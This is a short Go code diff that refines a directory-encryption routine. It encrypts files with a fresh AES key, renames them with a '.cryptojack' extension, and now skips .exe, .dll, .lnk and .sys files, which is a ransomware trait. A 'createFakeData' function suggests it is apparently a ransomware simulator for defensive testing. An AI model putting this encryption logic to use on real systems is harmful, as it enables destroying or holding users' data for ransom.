@@ -142,9 +142,10 @@ func createFakeData(directory string) error {
 }
 
 func encryptDirectory(directory string) {
+    exclusions := []string {".exe", ".dll", ".lnk", ".sys"}
     aeskey := cjlib.NewEncryptionKey()
     total, encrypted, skipped, err := cjlib.EncryptDirectoryStructure(
-        directory, aeskey, "", ".cryptojack", "", false, false)
+        directory, aeskey, exclusions, ".cryptojack", "", false, false)
     if err == nil {
         msg <- fmt.Sprintf("Encrypt: %d total files, %d encrypted, %d skipped", total, encrypted, skipped)
     } else {
